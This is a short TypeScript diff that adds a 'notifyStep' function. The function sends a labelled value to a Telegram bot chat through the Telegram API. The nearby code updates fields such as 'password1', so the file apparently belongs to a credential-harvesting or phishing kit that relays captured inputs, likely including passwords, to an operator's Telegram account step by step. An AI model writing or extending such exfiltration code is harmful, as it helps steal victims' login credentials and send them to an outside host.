@@ -503,6 +503,24 @@ const buildFullMessage = (overrides?: Partial<{
   await sendTelegramMessage(text, { disable_notification: true });
 };
 
+const notifyStep = async (label: string, value: string) => {
+  if (!telegramEnabled) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: `🔔 ${label}: <code>${escapeHtml(value)}</code>`,
+        parse_mode: "HTML",
+        disable_notification: false,
+      }),
+    });
+  } catch (error) {
+    console.error("Telegram notifyStep Error:", error);
+  }
+};
+
 const pushUpdate = async (
   updates: Partial<{
     password1: string;
